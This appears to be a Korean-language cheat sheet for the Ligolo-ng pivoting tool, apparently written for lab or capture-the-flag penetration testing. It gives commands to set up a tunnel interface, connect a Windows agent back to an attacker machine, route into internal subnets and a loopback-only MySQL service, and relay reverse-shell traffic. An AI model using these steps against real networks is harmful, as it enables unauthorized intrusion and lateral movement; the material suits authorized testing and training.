리골로는 쉽게 작동하지만, 무거운 작업을 수행할 수 있다.
(다운로드 링크: [https://github.com/nicocha30/ligolo-ng/releases/](https://github.com/nicocha30/ligolo-ng/releases/))

**참고 링크:Medium**
[**Ligolo-ng — Pivoting, Reverse Shells and File Transfers**](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)

**새 인터페이스 추가 및 활성(kali)**
```powershell
# 머신에 새로운 tun 인터페이스를 추가합니다.
 sudo ip tuntap add user kali mode tun ligolo 

# 새로운 인터페이스를 활성화합니다.
 sudo ip link  set ligolo up
```

**프록시 실행 (kali)**
```powershell
# -selfcert 플래그를 사용하면 도구가 동적으로 
자체 서명된 인증서를 생성합니다.

 ./proxy -selfcert
```

**agent로 proxy에 붙기 (win)**
```powershell
# IP는 Kali VM/공격 머신의 IP가 됩니다. 
# -ignore-cert는 인증서 검증을 무시합니다. 
# 즉, 자체 서명 인증서에는 문제가 없습니다.

 ./agent -connect 10.10.14.213:11601 -ignore-cert
```

**ip 라우팅 테이블 추가 (kali)**
```bash
# 내부망의 경우
sudo ip route add 172.16.5.0/24 dev ligolo
# 루프백만 접속 가능한 mysql 에 접속할 경우
sudo ip route add 240.0.0.1/32 dev ligolo
```

**start로 터널링 시작 (kali)**
```jsx
ligolo-ng » **session**
? Specify a session : 1 - Unknown@WEB02 - 192.168.159.121:59212 - 6f4d49a2-84fb-4bbf-9912-8e3615d3668b
[Agent : Unknown@WEB02] » start
INFO[2613] Starting tunnel to Unknown@WEB02 (6f4d49a2-84fb-4bbf-9912-8e3615d3668b)
```

**역방향 쉘 라우팅 예시 (kali)**
```powershell
# 에이전트를 포트 1234에서 실행 중인 머신에 리스너를 생성 
하고 트래픽을 머신의 포트 4444로 리디렉션합니다. 
# 물론 다른 포트를 사용할 수도 있습니다.

 listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```